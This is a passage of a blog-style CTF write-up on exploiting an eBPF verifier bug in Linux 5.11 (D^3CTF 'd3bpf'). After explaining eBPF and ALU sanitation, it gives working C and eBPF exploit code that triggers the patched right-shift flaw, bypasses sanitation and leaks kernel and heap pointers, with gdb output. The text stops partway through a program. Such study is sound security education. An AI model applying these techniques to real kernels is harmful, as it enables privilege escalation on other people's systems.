<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-%28ft.-D-3CTF-d3bpf%29.html">Original</a>
    <h1>Learning eBPF Exploitation</h1>
    
    <div id="readability-page-1" class="page"><div>
	  <p>This post is gonna be about eBPF exploitation using a CTF challenge from D^3CTF named <code>d3bpf</code>. I have learnt so much while trying this challenge that I want to document all those findings and understanding as a future reference. All snippets gonna be from <code>v5.11</code> kernel as the challenge uses this version. Lets dig right in.</p>


<h2 id="what-is-ebpf">What is eBPF?</h2>
<p><code>eBPF</code> stands for <code>extended Berkeley Packet Filter</code>. Originally, <code>BPF</code> was intended for, as the name suggests, packet filtering. But because of its ease-of-use, it was later extended to <code>eBPF</code>. It provides a small instruction set for implementing various kinds of kernel programs which can be added to any supporting kernel version. Some example programs would be <a href="https://docs.kernel.org/trace/kprobes.html">kprobe</a> and packet filters. The provided code will be added to the kernel and will run under the kernel’s context. This very feature made it the prime target of vulnerability researchers.</p>

<h2 id="ebpf-programs">eBPF programs</h2>
<p>eBPF code is given to the kernel in form of a <code>eBPF program</code>. Each type of eBPF program have their own capabilities and features. One example would be <code>BPF_PROG_TYPE_SOCKET_FILTER</code>. This type of program are used for packer filtering and are attached to a particular socket, which is owned by the user. Whenever the socket receives a packet, the eBPF program is executed for performing packet filtering.</p>

<h2 id="ebpf-maps">eBPF Maps</h2>
<p>The main mechanism for interacting with eBPF programs is eBPF Maps. Maps are created by the user. They are key-value pairs. There are two main types of Maps, array or hash-table.</p>

<h2 id="ebpf-instruction-set">eBPF instruction set</h2>
<p>Covering full eBPF instruction set is out of scope of this article, I will only explain a few things. You can read about eBPF instruction in detail <a href="https://www.kernel.org/doc/html/latest/bpf/instruction-set.html">here</a>. eBPF provides ten registers <code>BPF_REG_{0..10}</code>. <code>BPF_REG_{1..5}</code> are used for calling functions (more on this later). The return value is stored in <code>BPF_REG_0</code> and <code>BPF_REG_10</code> is frame pointer for eBPF stack. When an eBPF program is ran, <code>BPF_REG_1</code> contains pointer to eBPF context which contains some information about the eBPF program.</p>
<div><div><pre><code>BPF_MOV64_IMM(BPF_REG_1, 1337)
</code></pre></div></div>
<p>Almost every instruction has a 32-bit and 64-bit variant and almost every instruction has a version for register and immediate. For example to put a 32-bit scalar to BPF_REG_1 and move BPF_REG_1 to BPF_REG_2:</p>
<div><div><pre><code>BPF_MOV32_IMM(BPF_REG_1, 1337)
BPF_MOV64_REG(BPF_REG_2, BPF_REG_1)
</code></pre></div></div>
<p>You can perform mathematical operations using <code>ALU{32,64}</code> on registers using the following syntax:</p>
<div><div><pre><code>BPF_ALU{32,64}_{IMM,REG}(P, BPF_REG_DEST, BPF_REG|IMM)
e.g. BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1337)
</code></pre></div></div>
<p>You can perform addition, subtraction, multiplication, division, and bit shifting on scalars.</p>

<p>For loading and storing values from memory using pointers, you can used following instructions:</p>
<div><div><pre><code>BPF_LDX_MEM(SIZE, BPF_REG_SRC, BPF_REG_DEST, OFFSET)
BPF_STX_MEM(SIZE, BPF_REG_DEST, BPF_REG_SRC, OFFSET)

e.g.
BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_2, 0) -&gt; BPF_REG_2 = *(u64 *)(BPF_REG_1 + 0)
BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_2, 0) -&gt; *(u64 *)(BPF_REG_1 + 0) = BPF_REG_2
</code></pre></div></div>
<p>eBPF also provides logical jumps:</p>
<div><div><pre><code>BPF_JMP_IMM(BPF_JNE, BPF_REG_1, 0, 1)
BPF_EXIT_INSN()
</code></pre></div></div>
<p>eBPF provides a few functions which can be called in eBPF programs. We will only be using map functions in this case. For map functions (<code>BPF_FUNC_map_{name}</code>), <code>BPF_REG_6</code> should contain pointer to context and <code>BPF_REG_{1..5}</code> contain the arguments. After a call, <code>BPF_REG_{1..5}</code> contain no values (set to unknown) because they are caller-saved registers and other registers are callee-saved registers. All map function require the map pointer to be in <code>BPF_REG_1</code>. Following is call example:</p>
<div><div><pre><code>BPF_MOV64_REG(BPF_REG_2, BPF_REG_10)
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4)
BPF_LD_MAP_FD(BPF_REG_1, &lt;map fd&gt;)
BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem)
</code></pre></div></div>
<p>If your program is of type <code>BPF_PROG_TYPE_SOCKET_FILTER</code>, you can use following instruction to load values from the <code>sk_buff</code> buffer:</p>

<p>Note that this will also clear the caller-saved registers.</p>

<p>For example programs, look at <a href="https://elixir.bootlin.com/linux/latest/source/samples/bpf">this link</a>.</p>

<h2 id="ebpf-verifier">eBPF verifier</h2>
<p>eBPF verifier is the most important component in eBPF as it ensures that no dangerous program will get executed.
In a nutshell, the verifier (<code>bpf_check</code>) visits each instruction and perform checks specific to the instruction and the context it is running in. For example, if we’re performing a pointer arithmetic operation, it needs to make sure that we don’t break out of the allowed area.</p>

<h2 id="alu-sanitation">ALU Sanitation</h2>
<p>ALU Sanitation is part of verifier which enforces the eBPF speculations at runtime. If the program is given by root, then there’s no ALU Sanitation as root can already read kernel pointer using kallsyms. ALU Sanitation is done on pointers. Before each addition or subtraction (on pointers), following instructions are added:</p>
<div><div><pre><code><span>BPF_MOV32_IMM</span><span>(</span><span>BPF_REG_AX</span><span>,</span> <span>aux</span><span>-&gt;</span><span>alu_limit</span> <span>-</span> <span>1</span><span>);</span> <span>// -1 in old kernel versions</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_SUB</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> <span>off_reg</span><span>);</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_OR</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> <span>off_reg</span><span>);</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_NEG</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> <span>0</span><span>);</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ARSH</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> <span>63</span><span>);</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_AND</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> <span>off_reg</span><span>);</span>
</code></pre></div></div>
<p>Here <code>BPF_REG_AX</code> is auxiliary register used by eBPF, <code>off_reg</code> is the register containing the offset to be added/subtracted from the pointer and <code>alu_limit</code> is the maximum value allowed for that operation. This set of instruction basically ensure that no value greater than <code>alu_limit - 1</code> gets added/subtraction from the pointer.
<code>alu_limit</code> is calculated based on the verifier’s information about that register.</p>

<h2 id="ebpf-execution">eBPF Execution</h2>
<p>If the program makes it past the verifier then (based on kernel config) it is either set to be interpreted at runtime or jited to machine code.</p>


<p>The challenge files are available <a href="https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2/blob/main/d3bpf/attachment/d3bpf-fe89139cf452491fc88158f672848c50a372e2ce6811644b28035361ea4fbd01.zip">here</a>.</p>

<h2 id="patch-analysis">Patch analysis</h2>
<p>The challenge adds a patch to one of the verifier functions for <code>BPF_RSH</code> (bitwise right shift).</p>
<div><div><pre><code><span>diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 37581919e..8e98d4af5 100644
</span><span>--- a/kernel/bpf/verifier.c
</span><span>+++ b/kernel/bpf/verifier.c
</span><span>@@ -6455,11 +6455,11 @@</span> static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
             scalar_min_max_lsh(dst_reg, &amp;src_reg);
         break;
     case BPF_RSH:
<span>-        if (umax_val &gt;= insn_bitness) {
-            /* Shifts greater than 31 or 63 are undefined.
-             * This includes shifts by a negative number.
-             */
-            mark_reg_unknown(env, regs, insn-&gt;dst_reg);
</span><span>+        if (umin_val &gt;= insn_bitness) {
+            if (alu32)
+                __mark_reg32_known(dst_reg, 0);
+            else
+                __mark_reg_known_zero(dst_reg);
</span>             break;
         }
         if (alu32)
</code></pre></div></div>
<p><code>adjust_scalar_min_max_vals</code> function is called whenever an instruction is visited to update the verifier state information about scalar regiters involved.</p>

<h2 id="triggering-vuln">Triggering vuln</h2>
<p>My first attempt was following:</p>
<div><div><pre><code><span>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;syscall.h&gt;
#include &lt;linux/bpf.h&gt;
#include &lt;sys/socket.h&gt;
#include &#34;bpf_insn.h&#34;
</span>
<span>int</span> <span>socks</span><span>[</span><span>2</span><span>]</span> <span>=</span> <span>{</span><span>-</span><span>1</span><span>};</span>

<span>int</span> <span>bpf</span><span>(</span><span>int</span> <span>cmd</span><span>,</span> <span>union</span> <span>bpf_attr</span> <span>*</span><span>attr</span><span>){</span>
    <span>return</span> <span>syscall</span><span>(</span><span>__NR_bpf</span><span>,</span> <span>cmd</span><span>,</span> <span>attr</span><span>,</span> <span>sizeof</span><span>(</span><span>*</span><span>attr</span><span>));</span>
<span>}</span>

<span>int</span> <span>bpf_prog_load</span><span>(</span><span>union</span> <span>bpf_attr</span> <span>*</span><span>attr</span><span>){</span>
    <span>return</span> <span>bpf</span><span>(</span><span>BPF_PROG_LOAD</span><span>,</span> <span>attr</span><span>);</span>
<span>}</span>

<span>union</span> <span>bpf_attr</span><span>*</span> <span>create_bpf_prog</span><span>(</span><span>struct</span> <span>bpf_insn</span> <span>*</span><span>insns</span><span>,</span> <span>unsigned</span> <span>int</span> <span>insn_cnt</span><span>){</span>
    <span>union</span> <span>bpf_attr</span> <span>*</span><span>attr</span> <span>=</span> <span>(</span><span>union</span> <span>bpf_attr</span> <span>*</span><span>)</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>union</span> <span>bpf_attr</span><span>));</span>

    <span>attr</span><span>-&gt;</span><span>prog_type</span> <span>=</span> <span>BPF_PROG_TYPE_SOCKET_FILTER</span><span>;</span>
    <span>attr</span><span>-&gt;</span><span>insn_cnt</span> <span>=</span> <span>insn_cnt</span><span>;</span>
    <span>attr</span><span>-&gt;</span><span>insns</span> <span>=</span> <span>(</span><span>uint64_t</span><span>)</span> <span>insns</span><span>;</span>
    <span>attr</span><span>-&gt;</span><span>license</span> <span>=</span> <span>(</span><span>uint64_t</span><span>)</span><span>&#34;&#34;</span><span>;</span>

    <span>return</span> <span>attr</span><span>;</span>
<span>}</span>

<span>int</span> <span>attach_socket</span><span>(</span><span>int</span> <span>prog_fd</span><span>){</span>
    <span>if</span><span>(</span><span>socks</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>-</span><span>1</span> <span>&amp;&amp;</span> <span>socketpair</span><span>(</span><span>AF_UNIX</span><span>,</span> <span>SOCK_DGRAM</span><span>,</span> <span>0</span><span>,</span> <span>socks</span><span>)</span> <span>&lt;</span> <span>0</span><span>){</span>
        <span>perror</span><span>(</span><span>&#34;socketpair&#34;</span><span>);</span>
        <span>exit</span><span>(</span><span>1</span><span>);</span>
    <span>}</span>
    
    <span>if</span><span>(</span><span>setsockopt</span><span>(</span><span>socks</span><span>[</span><span>0</span><span>],</span> <span>SOL_SOCKET</span><span>,</span> <span>SO_ATTACH_BPF</span><span>,</span> <span>&amp;</span><span>prog_fd</span><span>,</span> <span>sizeof</span><span>(</span><span>prog_fd</span><span>))</span> <span>&lt;</span> <span>0</span><span>){</span>
        <span>perror</span><span>(</span><span>&#34;setsockopt&#34;</span><span>);</span>
        <span>exit</span><span>(</span><span>1</span><span>);</span>
    <span>}</span>
<span>}</span>

<span>void</span> <span>setup_bpf_prog</span><span>(</span><span>struct</span> <span>bpf_insn</span> <span>*</span><span>insns</span><span>,</span> <span>uint</span> <span>insncnt</span><span>){</span>
    <span>char</span> <span>log_buffer</span><span>[</span><span>0x4000</span><span>];</span>

    <span>union</span> <span>bpf_attr</span> <span>*</span><span>prog</span> <span>=</span> <span>create_bpf_prog</span><span>(</span><span>insns</span><span>,</span> <span>insncnt</span><span>);</span>

    <span>prog</span><span>-&gt;</span><span>log_level</span> <span>=</span> <span>2</span><span>;</span>
    <span>prog</span><span>-&gt;</span><span>log_buf</span> <span>=</span> <span>(</span><span>uint64_t</span><span>)</span> <span>log_buffer</span><span>;</span>
    <span>prog</span><span>-&gt;</span><span>log_size</span> <span>=</span> <span>sizeof</span><span>(</span><span>log_buffer</span><span>);</span>
    <span>strncpy</span><span>(</span><span>prog</span><span>-&gt;</span><span>prog_name</span><span>,</span> <span>&#34;stdnoerr&#34;</span><span>,</span> <span>16</span><span>);</span>

    <span>int</span> <span>prog_fd</span> <span>=</span> <span>bpf_prog_load</span><span>(</span><span>prog</span><span>);</span>
    <span>printf</span><span>(</span><span>&#34;%d</span><span>\n</span><span>&#34;</span><span>,</span> <span>strlen</span><span>(</span><span>log_buffer</span><span>));</span>
    <span>puts</span><span>(</span><span>log_buffer</span><span>);</span>

    <span>if</span><span>(</span><span>prog_fd</span> <span>&lt;</span> <span>0</span><span>){</span>
        <span>perror</span><span>(</span><span>&#34;prog_load&#34;</span><span>);</span>
        <span>exit</span><span>(</span><span>1</span><span>);</span>
    <span>}</span>

    <span>attach_socket</span><span>(</span><span>prog_fd</span><span>);</span>
<span>}</span>

<span>void</span> <span>run_bpf_prog</span><span>(</span><span>struct</span> <span>bpf_insn</span> <span>*</span><span>insns</span><span>,</span> <span>uint</span> <span>insncnt</span><span>){</span>
    <span>int</span> <span>val</span> <span>=</span> <span>0</span><span>;</span>

    <span>setup_bpf_prog</span><span>(</span><span>insns</span><span>,</span> <span>insncnt</span><span>);</span>
    <span>write</span><span>(</span><span>socks</span><span>[</span><span>1</span><span>],</span> <span>&amp;</span><span>val</span><span>,</span> <span>sizeof</span><span>(</span><span>val</span><span>));</span>
<span>}</span>

<span>int</span> <span>main</span><span>(){</span>
    <span>struct</span> <span>bpf_insn</span> <span>insns</span><span>[]</span> <span>=</span> <span>{</span>
        <span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0x1337</span><span>),</span>
        <span>BPF_ALU64_IMM</span><span>(</span><span>BPF_RSH</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>64</span><span>),</span>
        <span>BPF_EXIT_INSN</span><span>()</span>
    <span>};</span>

    <span>run_bpf_prog</span><span>(</span><span>insns</span><span>,</span> <span>sizeof</span><span>(</span><span>insns</span><span>)</span><span>/</span><span>sizeof</span><span>(</span><span>insns</span><span>[</span><span>0</span><span>]));</span>
<span>}</span>
</code></pre></div></div>
<p>I set a breakpoint at <code>*sk_filter_trim_cap + 140</code> to see the code in action.
The code compilation failed with the following logger buffer output</p>
<div><div><pre><code>func#0 @0
0: R1=ctx(id=0,off=0,imm=0) R10=fp0
0: (b7) r0 = 4919
1: R0_w=invP4919 R1=ctx(id=0,off=0,imm=0) R10=fp0
1: (77) r0 &gt;&gt;= 64
invalid shift 64
processed 2 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0
</code></pre></div></div>
<p>This error is because of <a href="https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/verifier.c#L6737">this line</a>.
The verifier actually already has a check for invalid shifts. But this check is only for immediate values.</p>
<div><div><pre><code><span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0x1337</span><span>),</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>64</span><span>),</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_RSH</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>BPF_REG_1</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>()</span>
</code></pre></div></div>
<p>And voila! we triggered the vuln.</p>

<h2 id="getting-a-leak">Getting a leak</h2>
<p>Now that we have a value that the verifier thinks is <code>0</code>, we can use it to perform pointer arithmetic to access out-of-bounds memory. Accessing oob memory of a map can be used to get a kernel leak. eBPF maps use the following struct:</p>
<div><div><pre><code><span>struct</span> <span>bpf_map</span> <span>{</span>
	<span>const</span> <span>struct</span> <span>bpf_map_ops</span> <span>*</span><span>ops</span> <span>____cacheline_aligned</span><span>;</span>
	<span>struct</span> <span>bpf_map</span> <span>*</span><span>inner_map_meta</span><span>;</span>
<span>#ifdef CONFIG_SECURITY
</span>	<span>void</span> <span>*</span><span>security</span><span>;</span>
<span>#endif
</span>	<span>enum</span> <span>bpf_map_type</span> <span>map_type</span><span>;</span>
	<span>u32</span> <span>key_size</span><span>;</span>
	<span>u32</span> <span>value_size</span><span>;</span>
	<span>u32</span> <span>max_entries</span><span>;</span>
	<span>u32</span> <span>map_flags</span><span>;</span>
	<span>int</span> <span>spin_lock_off</span><span>;</span> <span>/* &gt;=0 valid offset, &lt;0 error */</span>
	<span>u32</span> <span>id</span><span>;</span>
	<span>int</span> <span>numa_node</span><span>;</span>
	<span>u32</span> <span>btf_key_type_id</span><span>;</span>
	<span>u32</span> <span>btf_value_type_id</span><span>;</span>
	<span>struct</span> <span>btf</span> <span>*</span><span>btf</span><span>;</span>
<span>#ifdef CONFIG_MEMCG_KMEM
</span>	<span>struct</span> <span>mem_cgroup</span> <span>*</span><span>memcg</span><span>;</span>
<span>#endif
</span>	<span>char</span> <span>name</span><span>[</span><span>BPF_OBJ_NAME_LEN</span><span>];</span>
	<span>u32</span> <span>btf_vmlinux_value_type_id</span><span>;</span>
	<span>bool</span> <span>bypass_spec_v1</span><span>;</span>
	<span>bool</span> <span>frozen</span><span>;</span> <span>/* write-once; write-protected by freeze_mutex */</span>
	<span>atomic64_t</span> <span>refcnt</span> <span>____cacheline_aligned</span><span>;</span>
	<span>atomic64_t</span> <span>usercnt</span><span>;</span>
	<span>struct</span> <span>work_struct</span> <span>work</span><span>;</span>
	<span>struct</span> <span>mutex</span> <span>freeze_mutex</span><span>;</span>
	<span>u64</span> <span>writecnt</span><span>;</span> <span>/* writable mmap cnt; protected by freeze_mutex */</span>

    <span>// map specific data</span>
<span>};</span>
</code></pre></div></div>
<p>We will be using only Array maps (<code>BPF_MAP_TYPE_ARRAY</code>) in the exploit. Its struct is as follows:</p>
<div><div><pre><code><span>struct</span> <span>bpf_array</span> <span>{</span>
	<span>struct</span> <span>bpf_map</span> <span>map</span><span>;</span>
	<span>u32</span> <span>elem_size</span><span>;</span>
	<span>u32</span> <span>index_mask</span><span>;</span>
	<span>struct</span> <span>bpf_array_aux</span> <span>*</span><span>aux</span><span>;</span>
	<span>union</span> <span>{</span>
		<span>char</span> <span>value</span><span>[</span><span>0</span><span>]</span> <span>__aligned</span><span>(</span><span>8</span><span>);</span>
		<span>void</span> <span>*</span><span>ptrs</span><span>[</span><span>0</span><span>]</span> <span>__aligned</span><span>(</span><span>8</span><span>);</span>
		<span>void</span> <span>__percpu</span> <span>*</span><span>pptrs</span><span>[</span><span>0</span><span>]</span> <span>__aligned</span><span>(</span><span>8</span><span>);</span>
	<span>};</span>
<span>};</span>
</code></pre></div></div>
<p><code>ops</code> contains a kernel pointer since the allowed functions for a certain map type are declared at compile time.</p>
<div><div><pre><code><span>oob_map_fd</span> <span>=</span> <span>bpf_map_create</span><span>(</span><span>4</span><span>,</span> <span>0x150</span><span>,</span> <span>1</span><span>);</span>
</code></pre></div></div>
<p>We will use <code>BPF_FUNC_map_lookup_elem</code> to get a pointer to the <code>value</code> correponding to the <code>key</code> (basically a pointer to start of user-controlled data).</p>
<div><div><pre><code><span>// load map_ptr_or_null in BPF_REG_0</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_W</span><span>,</span> <span>BPF_REG_10</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>-</span><span>4</span><span>),</span>
<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_6</span><span>,</span> <span>BPF_REG_1</span><span>),</span>
<span>BPF_LD_MAP_FD</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>oob_map_fd</span><span>),</span>
<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_REG_10</span><span>),</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>),</span>
<span>BPF_CALL_FUNC</span><span>(</span><span>BPF_FUNC_map_lookup_elem</span><span>),</span>
<span>// returns map_ptr + 0x110 (offset of .values in bpf_array)</span>

<span>// convert map_ptr_or_null -&gt; map_ptr to perform further operations</span>
<span>BPF_JMP_IMM</span><span>(</span><span>BPF_JNE</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>
</code></pre></div></div>
<p>Now we use the verifier’s wrong assumption about the register with value of <code>0</code> (say <code>BPF_REG_0</code>) to perform pointer subtraction on it to move it back to start of <code>bpf_array</code> struct so we can read <code>ops</code> pointer.
To do that, we need to bypass ALU Sanitation also.</p>
<div><div><pre><code><span>// trigger vuln and make eBPF think we are still map_ptr + 0x110</span>
<span>// but in reality we&#39;re map_ptr + 0x0</span>
<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>),</span>
<span>// ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used</span>
<span>// hence any 32-bit value can be used</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0x110</span><span>),</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>64</span><span>),</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_RSH</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>BPF_REG_1</span><span>),</span> <span>// the bug</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_SUB</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>),</span> <span>// map_ptr + 0x110 -&gt; map_ptr + 0x0</span>
</code></pre></div></div>
<p>Now we read <code>ops</code> and write it at <code>map_ptr + 0x110</code> to read it from userspace.</p>
<div><div><pre><code><span>// load the ptr (kbase leak)</span>
<span>BPF_LDX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_8</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0</span><span>),</span>
<span>// make map_ptr + 0x0 to map_ptr + 0x110</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0x110</span><span>),</span> 
<span>// write array_map_ops ptr to maps_ptr + 0x110</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_8</span><span>,</span> <span>0</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>
</code></pre></div></div>
<p>And we get the kbase:</p>
<div><div><pre><code>array_map_ops: 0xffffffff820363a0
kbase: 0xffffffff81000000
</code></pre></div></div>
<p>When I stepped through program using gdb, I saw something interesting in map data:</p>
<div><div><pre><code>gef➤  x/26gx 0xffff888004e23400   &lt;-- map_ptr
0xffff888004e23400:     0xffffffff820363a0      0x0000000000000000
0xffff888004e23410:     0x0000000000000000      0x0000000400000002
0xffff888004e23420:     0x0000000100000150      0xffffffea00000000
0xffff888004e23430:     0xffffffff00000001      0x0000000000000000
0xffff888004e23440:     0x0000000000000000      0xffff88800392b000
0xffff888004e23450:     0x0000000000000000      0x0000000000000000
0xffff888004e23460:     0x0000000000000000      0x0000000000000000
0xffff888004e23470:     0x0000000000000000      0x0000000000000000
0xffff888004e23480:     0x0000000000000002      0x0000000000000001
0xffff888004e23490:     0x0000000000000000      0x0000000000000000
0xffff888004e234a0:     0x0000000000000000      0x0000000000000000
0xffff888004e234b0:     0x0000000000000000      0x0000000000000000
0xffff888004e234c0:     0xffff888004e234c0      0xffff888004e234c0 &lt;-- a self-pointer
</code></pre></div></div>
<p>This is because of <code>bpf_map</code>’s member <code>work</code> (type <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/workqueue.h#L102"><code>work_struct</code></a>). It contains a doubly-linked list (to keep track of bpf maps?). We can use it to leak <code>map_ptr</code>.</p>
<div><div><pre><code><span>// map_ptr + 0x0 -&gt; map_ptr + 0xc0</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0xc0</span><span>),</span>
<span>// load the ptr (heap leak)</span>
<span>BPF_LDX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_9</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0</span><span>),</span>
<span>// make map_ptr + 0xc0 to map_ptr + 0x110</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0x50</span><span>),</span>
<span>// write *(map_ptr + 0xc0) to maps_ptr + 0x118</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_9</span><span>,</span> <span>8</span><span>),</span>
</code></pre></div></div>
<div><div><pre><code>array_map_ops: 0xffffffff820363a0
kbase: 0xffffffff81000000
map_ptr: 0xffff888004e1a800
</code></pre></div></div>
<p>Here’s the main function so far:</p>
<div><div><pre><code><span>int</span> <span>oob_map_fd</span> <span>=</span> <span>bpf_map_create</span><span>(</span><span>4</span><span>,</span> <span>0x150</span><span>,</span> <span>1</span><span>);</span>

<span>struct</span> <span>bpf_insn</span> <span>kleak_prog</span><span>[]</span> <span>=</span> <span>{</span>
    <span>// load map_ptr_or_null in BPF_REG_0</span>
    <span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span>
    <span>BPF_STX_MEM</span><span>(</span><span>BPF_W</span><span>,</span> <span>BPF_REG_10</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>-</span><span>4</span><span>),</span>
    <span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_6</span><span>,</span> <span>BPF_REG_1</span><span>),</span>
    <span>BPF_LD_MAP_FD</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>oob_map_fd</span><span>),</span>
    <span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_REG_10</span><span>),</span>
    <span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>),</span>
    <span>BPF_CALL_FUNC</span><span>(</span><span>BPF_FUNC_map_lookup_elem</span><span>),</span>
    <span>// returns map_ptr + 0x110 (offset of .values in array_map)</span>

    <span>// map_ptr_or_null -&gt; map_ptr</span>
    <span>BPF_JMP_IMM</span><span>(</span><span>BPF_JNE</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>),</span>
    <span>BPF_EXIT_INSN</span><span>(),</span>

    <span>// trigger vuln and make eBPF think we are still map_ptr + 0x110</span>
    <span>// but in reality we&#39;re map_ptr + 0x0</span>
    <span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>),</span>
    <span>// ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used</span>
    <span>// hence any 32-bit value can be used</span>
    <span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0x110</span><span>),</span>
    <span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>64</span><span>),</span>
    <span>BPF_ALU64_REG</span><span>(</span><span>BPF_RSH</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>BPF_REG_1</span><span>),</span> <span>// the bug</span>
    <span>BPF_ALU64_REG</span><span>(</span><span>BPF_SUB</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>),</span>
    <span>BPF_LDX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_8</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0</span><span>),</span> <span>// load the ptr (kbase leak)</span>
    
    <span>// map_ptr + 0x0 -&gt; map_ptr + 0xc0</span>
    <span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0xc0</span><span>),</span>
    <span>BPF_LDX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_9</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0</span><span>),</span> <span>// load the ptr (heap leak)</span>

    <span>// write the read ptr to map for reading it from userspace</span>
    <span>// make map_ptr + 0xc0 to map_ptr + 0x110</span>
    <span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0x50</span><span>),</span> 
    <span>// write array_map_ops ptr to maps_ptr + 0x110</span>
    <span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_8</span><span>,</span> <span>0</span><span>),</span>
    <span>// write map_ptr + 0xc0 to maps_ptr + 0x118</span>
